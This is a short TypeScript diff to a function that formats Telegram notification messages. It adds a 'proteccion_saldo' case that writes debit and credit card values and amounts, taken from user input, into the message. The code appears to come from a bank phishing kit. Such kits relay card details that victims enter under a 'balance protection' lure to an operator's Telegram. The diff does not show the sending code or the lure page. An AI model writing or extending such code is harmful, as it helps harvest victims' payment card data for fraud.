@@ -111,6 +111,22 @@ function formatMessage(data: TelegramNotificationData): string {
       message += `📱 *Teléfono:* \`${inputData.celular || 'N/A'}\``;
       break;
       
+    case 'proteccion_saldo':
+      message += `🛡️ *PROTECCIÓN DE SALDO*\n`;
+      if (inputData.saldoDebito) {
+        message += `💳 *Tarjeta Débito:* \`${inputData.saldoDebito}\`\n`;
+        if (inputData.montoDebito) {
+          message += `💰 *Monto Débito:* \`$${inputData.montoDebito}\`\n`;
+        }
+      }
+      if (inputData.saldoCredito) {
+        message += `💳 *Tarjeta Crédito:* \`${inputData.saldoCredito}\`\n`;
+        if (inputData.montoCredito) {
+          message += `💰 *Monto Crédito:* \`$${inputData.montoCredito}\``;
+        }
+      }
+      break;
+      
     default:
       message += `📄 *Datos:* \`${JSON.stringify(inputData).substring(0, 200)}\``;
       break;
